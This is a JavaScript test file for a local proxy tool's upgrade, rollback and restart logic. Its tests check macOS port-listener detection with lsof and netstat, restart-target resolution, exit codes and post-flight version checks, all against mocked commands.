test("HIGH-1: netstat is invoked at its absolute path (/usr/sbin/netstat), not a bare 'netstat' a restricted PATH can fail to resolve", async () => {
  const lsofAmbiguousErr = Object.assign(new Error("Command failed: /usr/sbin/lsof -nP -iTCP:3456 -sTCP:LISTEN"), { status: 1, stdout: "", stderr: "" });
  // Only the absolute-path form is registered; a bare "netstat" would match no handler, throw
  // makeFakeRun's "no handler matched" error, and netstatHasListenerOnPort's catch would treat
  // that as "netstat failed to run" -> null -> refuse with the wrong (fail-closed) message
  // instead of the not-listening fallback this test expects.
  const run = makeFakeRun({ "/usr/sbin/lsof -nP": lsofAmbiguousErr, "/usr/sbin/netstat -an -p tcp": NETSTAT_NO_LISTENER });
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "darwin", mockPort: "3456", run,
    });
  } catch (e) { caught = e; }
  assert.ok(caught);
  assert.ok(/nothing is currently listening/.test(caught.message),
    `expected the not-listening refusal (proving the absolute-path netstat handler matched); got: ${caught.message}`);
});

test("FOLD-IN 1 (independent re-review of PR #240): netstat parser rejects an adjacent port that merely CONTAINS the target port's digits — mutation guard for `.includes()` replacing `.endsWith('.' + port)`", async () => {
  // "*.13456" and "*.34567" each contain "3456" as a substring without being port 3456 itself —
  // verified directly: "*.13456".endsWith(".3456") is false, "*.13456".includes("3456") is true.
  // Isolated from the TIME_WAIT/state-filter concern below: every row here IS in LISTEN state, so
  // this fixture cannot be satisfied by dropping the state filter — only a substring-match
  // regression in the address-suffix check would misread it.
  const netstatAdjacentPortsOnly = "Active Internet connections (including servers)\nProto Recv-Q Send-Q  Local Address          Foreign Address        (state)\ntcp4       0      0  *.13456                *.*                    LISTEN\ntcp6       0      0  *.34567                *.*                    LISTEN";
  const lsofNotListeningErr = Object.assign(new Error("Command failed"), { status: 1, stdout: "", stderr: "" });
  const run = makeFakeRun({ "/usr/sbin/lsof -nP": lsofNotListeningErr, "/usr/sbin/netstat": netstatAdjacentPortsOnly });
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "darwin", mockPort: "3456", run,
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "upgrade must refuse when nothing is listening on the mocked port");
  assert.ok(/nothing is currently listening/.test(caught.message),
    `an adjacent port containing the same digits must not be mistaken for the mocked port; got: ${caught.message}`);
});

test("FOLD-IN 1 (independent re-review of PR #240): netstat parser rejects a non-LISTEN row (TIME_WAIT) on the exact target port — mutation guard for dropping the \\bLISTEN\\b state filter", async () => {
  // 127.0.0.1.3456 IS an exact address-suffix match for the mocked port — but its state is
  // TIME_WAIT, the realistic shape of a socket the just-restarted process left behind. Isolated
  // from the substring-match concern above: this fixture has no adjacent-port row at all, so a
  // regression in the address-suffix check specifically would not be what makes this fail — only
  // dropping the LISTEN state filter would. This is also the actual danger dropping the filter
  // creates: a TIME_WAIT leftover misread as "still listening" would leave a --rollback's
  // not-listening fallback permanently unreachable, re-running into the identical state forever.
  const netstatTimeWaitOnly = "Active Internet connections (including servers)\nProto Recv-Q Send-Q  Local Address          Foreign Address        (state)\ntcp4       0      0  127.0.0.1.3456         127.0.0.1.54321        TIME_WAIT";
  const lsofNotListeningErr = Object.assign(new Error("Command failed"), { status: 1, stdout: "", stderr: "" });
  const run = makeFakeRun({ "/usr/sbin/lsof -nP": lsofNotListeningErr, "/usr/sbin/netstat": netstatTimeWaitOnly });
  const result = await runUpgrade({
    rollback: true, yes: true, mockExec: true,
    mockPlatform: "darwin", mockPort: "3456", run,
    mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
    mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
  });
  const restartCmds = result.phases.filter(p => p.name === "restart").map(p => p.cmd);
  assert.equal(restartCmds.length, 2, "a TIME_WAIT socket on the target port must not block the not-listening fallback from firing");
  assert.ok(restartCmds[0].includes("launchctl bootout"));
});

test("FOLD-IN 2 (independent re-review of PR #240): a whitespace-padded CLAUDE_PROXY_PORT with a REAL listener must refuse on --rollback, not silently proceed", async () => {
  // Number(" 3456 ") === 3456 (ToNumber tolerates leading/trailing whitespace per the spec), so
  // port VALIDATION passes for a padded value — but the raw, still-padded string used to reach
  // both the lsof shell command and the netstat suffix computation unmodified. Before this fix:
  // lsof ran as `-iTCP: 3456  -sTCP:LISTEN` (malformed — shell-split, embedded spaces) and the
  // netstat suffix became ". 3456 ", matching no real address in netstat's output — a REAL
  // listener was read as "nothing is listening", and on --rollback that PROCEEDED with the
  // launchctl bootout/bootstrap pair against a port a real process still held. Verified live
  // against this host. `server.mjs:348` uses `parseInt`, which tolerates the same padding and
  // binds correctly, so this misconfiguration was invisible everywhere except here.
  const lsofAmbiguousErr = Object.assign(new Error("Command failed"), { status: 1, stdout: "", stderr: "" });
  // Keyed on the STATIC prefix only — matches both the pre-fix malformed command (raw padded
  // port interpolated) and the post-fix clean one (portNum interpolated), so this test is driven
  // by what `port` value reaches netstatHasListenerOnPort, not by which lsof command string ran.
  const run = makeFakeRun({ "/usr/sbin/lsof -nP -iTCP:": lsofAmbiguousErr, "/usr/sbin/netstat": NETSTAT_HAS_LISTENER_3456 });
  let caught = null;
  try {
    await runUpgrade({
      rollback: true, yes: true, mockExec: true,
      mockPlatform: "darwin", mockPort: " 3456 ", run,
      mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
      mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "a padded port with a live listener must refuse, not silently proceed");
  assert.ok(!caught.phases?.some(p => p.name === "restart" && /launchctl bootout/.test(p.cmd || "")),
    "no bootout/bootstrap command may appear in phases — the fallback must not have fired for a port that is actually live");
});

test("HIGH-1: an invalid CLAUDE_PROXY_PORT is rejected as unknown BEFORE ever probing lsof or netstat", async () => {
  // A non-numeric or non-positive port would otherwise reach `-iTCP:<port>` and produce the same
  // ambiguous shape as a privilege gap or genuine non-listener; refuse to probe it at all. The
  // fake run below has NO handlers registered — either command being invoked throws "no handler
  // matched", which would surface as a DIFFERENT (still-refusing, but wrongly-worded) failure,
  // so this also proves neither lsof nor netstat is ever shelled out to for a bad port.
  const run = makeFakeRun({});
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "darwin", mockPort: "not-a-port", run,
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "an invalid port must refuse");
  assert.ok(/could not determine what.*owns the OCP port/s.test(caught.message), `expected the "could not determine" refusal; got: ${caught.message}`);
  assert.ok(!/no handler matched/.test(caught.message), "lsof/netstat must never actually be invoked for an invalid port");
});

test("issue #233 defect 1 control: a genuine lsof failure (missing binary, exit 127) still maps to unknown and refuses — the fix is not overly permissive", async () => {
  const lsofMissingErr = Object.assign(new Error("Command failed: /usr/sbin/lsof -nP -iTCP:3456 -sTCP:LISTEN"), { status: 127, stdout: "", stderr: "/bin/sh: /usr/sbin/lsof: No such file or directory" });
  const run = makeFakeRun({ "/usr/sbin/lsof -nP": lsofMissingErr });
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "darwin", run,
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "upgrade must refuse when it genuinely cannot tell what owns the port");
  assert.ok(/could not determine what.*owns the OCP port/s.test(caught.message), `expected the "could not determine" refusal; got: ${caught.message}`);
  assert.ok(!/nothing is currently listening/.test(caught.message), `must not be mistaken for not-listening; got: ${caught.message}`);
});

test("issue #233 defect 1: lsof is invoked at its absolute path (/usr/sbin/lsof), not a bare 'lsof' a restricted PATH can fail to resolve", async () => {
  // Live-verified on this host: `which lsof` (a restricted, sbin-less PATH) fails, while
  // `/usr/sbin/lsof` runs cleanly — this is the exact gap the fix closes. The fake run below
  // registers ONLY the absolute-path form; a bare "lsof" command would match no handler, throw
  // makeFakeRun's own "no handler matched" error (no `.status`), map to null/"unknown", and this
  // test would fail with a refusal instead of a successful restart plan.
  const run = makeFakeRun({
    "/usr/sbin/lsof -nP -iTCP:": `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    12345 opc   23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    // issue #239: see the "macOS path calls lsof" test above for why this handler is required now.
    "launchctl print": LAUNCHCTL_PRINT_RUNNING_OCP_12345,
  });
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
    mockPlatform: "darwin", run,
  });
  const restartCmds = result.phases.filter(p => p.name === "restart").map(p => p.cmd);
  assert.equal(restartCmds.length, 2);
  assert.ok(restartCmds[0].includes("launchctl bootout"));
});

// ── #224: cmd_restart itself still hard-coded a restart target, zero unit resolution ─────────
// Everything above overrides cmd_restart wholesale (a necessary safety default — see
// serviceStubsSucceed's own comment), so none of it exercises the REAL cmd_restart body. These
// three tests set overrideCmdRestart:false specifically to reach it: cmd_restart must now
// resolve its target by shelling out to `scripts/upgrade.mjs --resolve-restart` (the same
// resolver PR #221 already wired into scripts/upgrade.mjs's own restart phases — see
// scripts/lib/restart-unit.mjs), never falling back to a hard-coded guess, and must return a
// real, non-zero exit code on refusal instead of always reporting success (issue #224's own
// complaint: "cmd_restart currently has no failure exit code at all").
console.log("\ncmd_restart resolver wiring (#224):");

test("#224: cmd_restart refuses when the resolver can't determine the restart target -- no hard-coded fallback, real exit code", () => {
  const r = _bwHarnessRun({
    args: ["restart"],
    overrideCmdRestart: false,
    resolveRestartExit: 1,
    resolveRestartStderr: ["restart aborted: MOCK-RESOLVER-REFUSAL-MARKER"],
    // Mixed signal, deliberately: the mock ALSO leaks a would-be command on stdout even though
    // it exits non-zero (a real `--resolve-restart` never does both, but a bug that checks the
    // wrong thing — e.g. "did stdout have content" instead of "did the exit code say ok" — would
    // still eval this if only the exit code were dropped). Proves the guard keys off the exit
    // status, not stdout emptiness: this string must NEVER reach a real command.
    resolveRestartStdout: ["systemctl restart -- SHOULD-NEVER-RUN.service"],
  });
  assert.notEqual(r.status, 0,
    `cmd_restart must exit non-zero on a resolver refusal (the "no failure exit code at all" ` +
    `bug); status=${r.status} stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
  assert.ok((r.stdout + r.stderr).includes("MOCK-RESOLVER-REFUSAL-MARKER"),
    `the resolver's refusal message must reach the operator, not be swallowed; ` +
    `stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(!_bwCalled(r.log, "FAKE-SYSTEMCTL-CALL restart -- SHOULD-NEVER-RUN.service"),
    `a leaked stdout command must NEVER run once the resolver signaled failure via its exit ` +
    `code; log=${JSON.stringify(r.log)}`);
  for (const name of ["SYSTEMCTL", "LAUNCHCTL", "PKILL", "NOHUP"]) {
    assert.ok(!_bwCalled(r.log, `FAKE-${name}-CALL`),
      `${name} must NEVER be invoked after a resolver refusal -- that would repeat issue #215's ` +
      `hard-coded guess; log=${JSON.stringify(r.log)}`);
  }
});

test("#224: cmd_restart runs the resolver's actual resolved command, not the old hard-coded guess", () => {
  const r = _bwHarnessRun({
    args: ["restart"],
    overrideCmdRestart: false,
    resolveRestartExit: 0,
    resolveRestartStdout: ["systemctl restart -- ocp.service"],
    serviceStubsSucceed: true,
    curlHealthExit: 1, // deterministic health-check failure; this test is only about which restart command ran
  });
  assert.ok(_bwCalled(r.log, "FAKE-SYSTEMCTL-CALL restart -- ocp.service"),
    `must run the resolver's resolved command verbatim; log=${JSON.stringify(r.log)}`);
  assert.ok(!r.log.some((l) => l.startsWith("FAKE-SYSTEMCTL-CALL") && l.includes("--user restart ocp-proxy")),
    `must NOT fall back to the old hard-coded "systemctl --user restart ocp-proxy"; log=${JSON.stringify(r.log)}`);
  assert.ok(r.stdout.includes("systemctl restart -- ocp.service"),
    `the resolved command must be visible to the operator, not suppressed; stdout=${JSON.stringify(r.stdout)}`);
  assert.notEqual(r.status, 0,
    `the health check was made to fail on purpose; cmd_restart must still report a real, ` +
    `non-zero exit code (not the old implicit success); status=${r.status}`);
});

// ── MEDIUM-2 (independent review round 1, blocking): cmd_restart's own SUCCESS path calls
// cmd_usage as a nice-to-have post-restart display, but cmd_usage's own `/usage` probe does
// `exit 1` (not `return 1`) if it fails -- and it fails whenever `/usage` returns non-2xx, which
// happens right after a restart before the proxy has warmed back up (a real, demonstrated case,
// not hypothetical). Before this fix, that turned a GENUINELY SUCCESSFUL restart into an overall
// failure -- indistinguishable from a real restart failure to anything checking cmd_restart's own
// exit code, which #241/PR #255 was the first caller to actually do. This harness has no
// `curlResponses` capability (that landed on the sibling #242 branch, not yet merged here), so
// the DEFAULT curl stub's own refusal for any URL other than "*/health*" (exit 94) already
// reproduces "the /usage probe fails" without needing one -- `curl -sf` on a non-2xx/unreachable
// response is exactly what makes cmd_usage's own guard fire.
test("#241 MEDIUM-2 (the money test): a healthy restart with a merely-cosmetic /usage display failure must NOT make cmd_restart itself report failure", () => {
  const r = _bwHarnessRun({
    args: ["restart"], overrideCmdRestart: false,
    resolveRestartExit: 0, resolveRestartStdout: ["true"],
    curlHealthExit: 0,
  });
  assert.equal(r.status, 0,
    `a genuinely successful restart (resolver ok, restart command ok, health check ok) must ` +
    `report success even though the COSMETIC post-restart usage display failed; status=${r.status} ` +
    `stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("✓ Proxy restarted successfully."), `expected the success line; stdout=${JSON.stringify(r.stdout)}`);
});

test("#241 MEDIUM-2: the SAME scenario end-to-end through _cmd_update_light -- a healthy restart's cosmetic /usage failure must not make the light path report overall failure either", () => {
  const r = _bwHarnessRun({
    kind: "update", args: ["update"], overrideCmdRestart: false,
    resolveRestartExit: 0, resolveRestartStdout: ["true"],
    curlHealthExit: 0, postFlightExit: 0,
  });
  assert.equal(r.status, 0,
    `the light path must report success when the restart genuinely succeeded and post-flight ` +
    `passed, even though cmd_restart's own cosmetic /usage display failed; status=${r.status} ` +
    `stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
});

test("#224: _cmd_update_light no longer swallows cmd_restart's refusal (operator sees why it failed, and the exit code is non-zero)", () => {
  const r = _bwHarnessRun({
    kind: "update",
    args: ["update"],
    overrideCmdRestart: false,
    resolveRestartExit: 1,
    resolveRestartStderr: ["restart aborted: MOCK-RESOLVER-REFUSAL-MARKER-LIGHT"],
    resolveRestartStdout: ["systemctl restart -- SHOULD-NEVER-RUN.service"],
  });
  assert.ok(r.stdout.includes("Updating OCP (light path)"),
    `sanity check that we actually reached _cmd_update_light; stdout=${JSON.stringify(r.stdout)}`);
  assert.notEqual(r.status, 0,
    `ocp update (light path) must exit non-zero when the restart phase refuses; status=${r.status}`);
  assert.ok(!_bwCalled(r.log, "FAKE-SYSTEMCTL-CALL restart -- SHOULD-NEVER-RUN.service"),
    `a leaked stdout command must NEVER run once the resolver signaled failure via its exit ` +
    `code; log=${JSON.stringify(r.log)}`);
  assert.ok((r.stdout + r.stderr).includes("MOCK-RESOLVER-REFUSAL-MARKER-LIGHT"),
    `_cmd_update_light must surface cmd_restart's refusal message instead of discarding it via ` +
    `its old "> /dev/null 2>&1"; stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
});

// ── #263: cmd_restart gateway's `openclaw gateway restart 2>&1` had the same shape as the
// python3 sites #242 fixed and the curl sites #261 fixes — a bare external-command call with no
// `||` handling, so `set -e` (ocp:7) killed the whole `ocp` process the instant `openclaw` was
// missing (bash's own "command not found", exit 127), with no OCP-level framing distinguishing
// that from openclaw being installed but its OWN restart genuinely failing. OpenClaw is an
// OPTIONAL sibling tool (AGENTS.md "What this project is") — its absence is a normal
// configuration, not a fault, so this is the one call site in this family where "the command
// could not run" gets a SUCCESS exit code (0) and a calm, informational message rather than
// #261's "loud local-fault" treatment, while "installed and failed" stays loud and non-zero.
// `overrideCmdRestart: false` drives these through the REAL cmd_restart body via ocp's real
// top-level dispatch (`args: ["restart", "gateway"]`), the only way to reach this branch.
//
// Independent review round 1: the message says "not found on $PATH", not "not installed" — a
// non-interactive shell's $PATH (a bare `ssh host 'ocp restart gateway'`, in particular) can
// omit directories an interactive login shell's $PATH includes, so exit 127 here does not prove
// absence, only that this invocation's $PATH did not resolve openclaw. Test names/assertions
// below were updated to match; this is a wording correction, not a behavior change (still exit
// 0, still calm, still on stdout).
console.log("\ncmd_restart gateway: 'not found on $PATH' vs 'installed and failed' (#263):");

test("#263 cmd_restart gateway: openclaw not found on $PATH is reported once, calmly, on stdout, and reports SUCCESS", () => {
  const r = _bwHarnessRun({ args: ["restart", "gateway"], overrideCmdRestart: false, openclawAbsent: true });
  assert.equal(r.status, 0,
    `absence of an OPTIONAL sibling tool must not fail 'ocp restart gateway'; status=${r.status} ` +
    `stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("not found on"),
    `expected the corrected 'not found on $PATH' wording (NOT 'not installed' -- that overclaims), got stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(!r.stdout.toLowerCase().includes("not installed"),
    `must NOT claim "not installed" -- a non-interactive $PATH lookup cannot establish that; stdout=${JSON.stringify(r.stdout)}`);
  assert.equal(r.stderr, "", `absence-from-$PATH is not an error — stderr must stay clean; got: ${JSON.stringify(r.stderr)}`);
  assert.ok(_bwCalled(r.log, "FAKE-OPENCLAW-ABSENT-CALL"), `sanity check the absent stub was actually reached; log=${JSON.stringify(r.log)}`);
});

test("#263 cmd_restart gateway: openclaw installed but its OWN restart fails is reported LOUDLY, on stderr, with a nonzero exit", () => {
  const r = _bwHarnessRun({ args: ["restart", "gateway"], overrideCmdRestart: false });
  assert.notEqual(r.status, 0,
    `a REAL failure of an installed tool must be reported as failure, not silently treated like ` +
    `an absent one; status=${r.status}`);
  assert.ok(r.stderr.includes("✗ openclaw gateway restart failed"),
    `expected a loud, labeled failure on stderr, got stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(_bwCalled(r.log, "FAKE-OPENCLAW-CALL"), `sanity check the (installed) stub was actually reached; log=${JSON.stringify(r.log)}`);
});

test("#263 control: cmd_restart gateway with openclaw installed and succeeding reports success and shows openclaw's own output", () => {
  const r = _bwHarnessRun({ args: ["restart", "gateway"], overrideCmdRestart: false, serviceStubsSucceed: true });
  assert.equal(r.status, 0, `expected a clean exit; status=${r.status} stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("gateway restarted"), `expected openclaw's own reported output, got stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(r.stdout.includes("✓ Gateway restarted."), `expected the success line, got stdout=${JSON.stringify(r.stdout)}`);
});

test("#263 the money contrast: 'not found on $PATH' (exit 0) and 'installed and failed' (nonzero) are genuinely distinguishable exit codes -- the bug's own complaint was that they were not", () => {
  const absent = _bwHarnessRun({ args: ["restart", "gateway"], overrideCmdRestart: false, openclawAbsent: true });
  const failed = _bwHarnessRun({ args: ["restart", "gateway"], overrideCmdRestart: false });
  assert.equal(absent.status, 0, `not-found-on-$PATH must be status 0; got ${absent.status}`);
  assert.notEqual(failed.status, 0, `installed-and-failed must be nonzero; got ${failed.status}`);
  assert.notEqual(absent.status, failed.status,
    `the two situations #263 describes as "today indistinguishable" must now genuinely differ`);
});

// ── Independent review round 1 (BLOCKING, case 6): the classifier used to also match a
// "command not found" TEXT substring against openclaw's COMBINED (2>&1) output, alongside the
// exit-127 check -- removed above because it carried zero tested behavior AND a real
// false-positive risk: openclaw is a subcommand dispatcher that shells out, so a genuinely
// FAILING, INSTALLED openclaw can print "command not found" as part of its own diagnostic
// output for an unrelated reason (a plugin/dependency lookup message, reproduced below). Before
// removal this reintroduced #263's own defect through the very marker meant to fix it: a real
// gateway failure silently reported as a successful no-op. This is the regression test for that
// specific text-arm, using the harness's new openclawFailExit/openclawFailOutput fixtures.
test("#263 case 6 (independent review round 1, blocking): openclaw installed and genuinely failing, whose own output happens to contain the phrase 'command not found', must still be reported LOUDLY and non-zero", () => {
  const r = _bwHarnessRun({
    args: ["restart", "gateway"], overrideCmdRestart: false,
    openclawFailExit: 2,
    openclawFailOutput: "gateway plugin error: dependency lookup failed (command not found in registry)",
  });
  assert.notEqual(r.status, 0,
    `a REAL failure must not be swallowed just because its own text happens to contain ` +
    `'command not found' -- that is #263's own defect, reintroduced through the marker meant ` +
    `to fix it; status=${r.status} stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(r.stderr.includes("✗ openclaw gateway restart failed"),
    `expected the loud, labeled failure message, got stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(!r.stdout.includes("not found on"),
    `must NOT be misreported as absent-from-$PATH; stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(_bwCalled(r.log, "FAKE-OPENCLAW-CALL"), `sanity check the (installed, failing) stub was actually reached; log=${JSON.stringify(r.log)}`);
});

// ── #241: _cmd_update_light gets --post-flight-only verification + explicit --target no-op ───
// #235 fixed the --dry-run mutation defect on the light path and deliberately deferred two more
// items out of that PR to keep it to the minimum reviewable unit: (1) post-flight verification
// mirroring _cmd_update_restart's own (#217) node scripts/upgrade.mjs --post-flight-only check,
// and (2) deciding what --target should do now that "$@" reaches this function. This is the
// fix for issue #214's actual incident, reproduced verbatim in #241: the tree lands on the new
// version, the running service stays on the old one (cmd_restart's own success criterion is
// just "/health responds", not "responds with the right version"), and a RETRY short-circuits at
// doctor's kind=noop check ("Already at latest. Nothing to do.", exit 0) without ever
// restarting -- only `curl $PROXY/health` told the truth in the real incident.
console.log("\n_cmd_update_light post-flight verification + --target handling (#241):");

test("#241 (the money test): light path reports FAILURE when post-flight verification does not confirm the new version, even though cmd_restart itself reported success", () => {
  // overrideCmdRestart stays at its default (true): the FAKE-CMD-RESTART-CALLED stub always
  // echoes "Restarting proxy..." / "✓ Proxy restarted successfully." and returns 0 -- exactly
  // the pre-#241 failure mode (a restart that LOOKS successful while the service is still
  // stale). postFlightExit:1 simulates the fake node --post-flight-only mode reporting the
  // service never reached the target version within budget.
  const r = _bwHarnessRun({ kind: "update", args: ["update"], postFlightExit: 1 });
  assert.ok(r.stdout.includes("Updating OCP (light path)"), `sanity check we reached _cmd_update_light; stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(_bwCalled(r.log, "FAKE-CMD-RESTART-CALLED"), `cmd_restart must still run; log=${JSON.stringify(r.log)}`);
  assert.ok(r.log.some((l) => l.includes("post-flight-only")), `post-flight verification must actually run; log=${JSON.stringify(r.log)}`);
  assert.notEqual(r.status, 0,
    `_cmd_update_light must report FAILURE when post-flight verification fails, even though ` +
    `cmd_restart itself reported success -- this is issue #214/#241's exact incident (tree ` +
    `updated, service stale, reported success anyway); status=${r.status}`);
});

test("#241 control: light path reports SUCCESS when post-flight verification confirms the new version (proves the money test's failure is real, not the path just always failing now)", () => {
  const r = _bwHarnessRun({ kind: "update", args: ["update"], postFlightExit: 0 });
  assert.equal(r.status, 0, `expected a clean exit when post-flight succeeds; status=${r.status} stderr=${r.stderr}`);
  assert.ok(_bwCalled(r.log, "FAKE-CMD-RESTART-CALLED"), `cmd_restart must run; log=${JSON.stringify(r.log)}`);
  assert.ok(r.log.some((l) => l.includes("post-flight-only")), `post-flight verification must run; log=${JSON.stringify(r.log)}`);
});

// MEDIUM-3 (independent review round 1): the original version of this test used this harness's
// STATIC package.json, where old_ver === new_ver === "3.26.0" always — a mutation swapping
// `"v$new_ver"` for the STALE `"v$old_ver"` at the real call site was therefore UNDETECTABLE
// (both values are identical, so the mutant and the fix produce byte-identical behavior). That
// mutant IS the bug this test is named after: verifying against the pre-pull version would let a
// stale process serving OLD code pass post-flight, exactly re-opening #241. Fixed with a fixture
// where the pull ACTUALLY changes the version (simulateGitPullVersionBump) and a node stub that
// only succeeds for the CORRECT post-pull target (postFlightExpectedTarget) — so using the stale
// value now fails this test with a target-mismatch, not merely produces the same log line.
test("#241 MEDIUM-3: post-flight verification target reflects the version the pull ACTUALLY landed on (v3.27.0), not the stale pre-pull version (v3.26.0)", () => {
  const r = _bwHarnessRun({
    kind: "update", args: ["update"],
    simulateGitPullVersionBump: true,
    postFlightExpectedTarget: "v3.27.0",
    postFlightExit: 0,
  });
  assert.equal(r.status, 0,
    `expected success when post-flight is checked against the CORRECT (post-pull) version -- a ` +
    `non-zero status here means the wrong (stale) version was sent; status=${r.status} stderr=${JSON.stringify(r.stderr)} log=${JSON.stringify(r.log)}`);
  assert.ok(r.log.some((l) => l.includes("FAKE-NODE-CALL") && l.includes("--post-flight-only") && l.includes("v3.27.0")),
    `expected the post-flight-only call to carry v3.27.0 (the version actually landed on), not v3.26.0 (stale); log=${JSON.stringify(r.log)}`);
});

// LOW-4 (independent review round 1): the outer `( cmd_restart ) || restart_status=$?` subshell
// in _cmd_update_light was previously untested for the one thing it exists to do -- contain a
// naked `exit` reached through cmd_restart's success path so it does not silently kill the whole
// process. `cmdRestartStubExits` reproduces that shape directly against the harness's OWN stub
// (independent of cmd_restart's real internals, which MEDIUM-2 above already fixed at the
// source), proving the containment is real: if the outer parens were ever removed, `exit 0`
// inside the (now-unwrapped) stub would terminate the ENTIRE bash process immediately -- with
// exit code 0, looking like a clean success -- and "Verifying restart...", the post-flight call,
// and everything after it would simply never run. Content-based assertions (not just the exit
// code, which would misleadingly still read as "0 = fine") are what catch that.
test("#241 LOW-4: the outer subshell around cmd_restart actually contains an exit() reached through its success path -- post-flight still runs afterward", () => {
  const r = _bwHarnessRun({ kind: "update", args: ["update"], cmdRestartStubExits: true, postFlightExit: 0 });
  assert.ok(_bwCalled(r.log, "FAKE-CMD-RESTART-CALLED"), `cmd_restart (stub) must have run; log=${JSON.stringify(r.log)}`);
  assert.ok(r.log.some((l) => l.includes("FAKE-NODE-CALL") && l.includes("--post-flight-only")),
    `post-flight verification must STILL run after a cmd_restart that exits (not returns) -- if ` +
    `this is missing, the outer subshell failed to contain the exit and the rest of the ` +
    `function silently never ran; log=${JSON.stringify(r.log)}`);
  assert.ok(r.stdout.includes("Verifying restart..."),
    `expected to reach the post-restart verification step's own output; stdout=${JSON.stringify(r.stdout)}`);
  assert.equal(r.status, 0, `expected a clean success given postFlightExit:0; status=${r.status} stderr=${r.stderr}`);
});

test("#241: a resolver refusal (cmd_restart itself fails) is NOT masked into success by post-flight happening to answer anyway", () => {
  // overrideCmdRestart:false lets the REAL cmd_restart run; the resolver refuses, so cmd_restart
  // itself returns non-zero (restart_status). postFlightExit defaults to 0 (the fake node stub
  // would "succeed") -- this proves the combined check does not let a lucky post-flight result
  // paper over a restart that never actually happened.
  const r = _bwHarnessRun({
    kind: "update", args: ["update"], overrideCmdRestart: false,
    resolveRestartExit: 1, resolveRestartStderr: ["restart aborted: MOCK-RESOLVER-REFUSAL-241"],
  });
  assert.notEqual(r.status, 0,
    `a cmd_restart refusal must still fail the light path even when post-flight's own (mocked) ` +
    `check would otherwise report success; status=${r.status}`);
  assert.ok((r.stdout + r.stderr).includes("MOCK-RESOLVER-REFUSAL-241"),
    `the refusal message must still reach the operator; stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
});

// ── MEDIUM-1 (independent review round 1): on a host where the package.json version read fails
// (python3 absent/broken specifically for that call — see #242/PR #252, the exact host class
// this incident class targets), `new_ver` degrades to the literal "?" via ocp's own pre-existing
// `2>/dev/null || echo "?"` fallback. Driving postFlightOk() directly: target "v?" -> the
// predicate strips the leading "v", is left with the non-empty string "?", and demands
// `body.version === "?"` -- never true for any real server. Before this fix, a FULLY SUCCESSFUL
// update on such a host would report failure and tell the operator to run `ocp doctor` for no
// real reason. The fix: skip strict post-flight verification (which cannot succeed without a
// known target anyway) and say so explicitly instead of either blocking a real success or
// silently claiming a verified one.
test("#241 MEDIUM-1 (the money test): a python3 failure isolated to the package.json version read does NOT force the light path to report failure", () => {
  const r = _bwHarnessRun({
    kind: "update", args: ["update"], pythonPackageJsonFails: true,
    // postFlightExit deliberately NOT set to 0 here -- if the code wrongly still called
    // --post-flight-only with "v?", the fake node stub's DEFAULT (0) would coincidentally look
    // like success, hiding the bug. The real defect is calling it AT ALL with an unverifiable
    // target and then depending on postFlightOk's own real (unmocked) logic, which the sibling
    // MEDIUM-1 control test below verifies directly.
  });
  assert.equal(r.status, 0,
    `a python3 failure isolated to the version read must not turn a real restart success into a ` +
    `reported failure; status=${r.status} stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(r.stderr.includes("Could not determine the installed version") && r.stderr.includes("skipping strict post-flight version verification"),
    `expected an explicit degraded-mode warning telling the operator verification was skipped, not silently claimed; stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(!r.log.some((l) => l.includes("FAKE-NODE-CALL") && l.includes("--post-flight-only")),
    `--post-flight-only must not be invoked with an unverifiable "v?" target at all; log=${JSON.stringify(r.log)}`);
});

